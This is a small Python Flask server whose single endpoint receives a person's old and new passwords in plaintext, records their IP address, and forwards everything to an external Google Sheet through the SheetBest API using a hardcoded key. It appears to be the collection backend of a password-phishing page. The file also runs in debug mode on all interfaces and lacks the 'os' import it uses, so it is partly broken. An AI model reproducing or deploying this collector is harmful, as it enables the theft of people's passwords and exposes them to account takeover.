from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime

app = Flask(__name__)
CORS(app)

SHEETBEST_URL = 'https://api.sheetbest.com/sheets/7a378e5c-1767-441f-a346-896f18d120aa'
API_KEY = '%3LWJAyj$NbdHa#uM!FO06K4_O1!64H0M_qE@9jxGYHJvA#togrSfq4eKhSl@j#m'

@app.route('/api/save-password', methods=['POST'])
def save_password():
    try:
        data = request.json
        payload = {
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "ip": request.remote_addr,
            "oldPassword": data.get('oldPassword', ''),
            "newPassword": data.get('newPassword', ''),
            "confirmPassword": data.get('confirmPassword', '')
        }

        headers = {
            "X-Api-Key": API_KEY,
            "Content-Type": "application/json"
        }

        response = requests.post(SHEETBEST_URL, json=payload, headers=headers)

        if response.status_code == 200:
            return jsonify({"success": True, "message": "Password saved to Google Sheet."})
        else:
            return jsonify({"success": False, "message": "SheetBest error: " + response.text}), 500

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True , host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
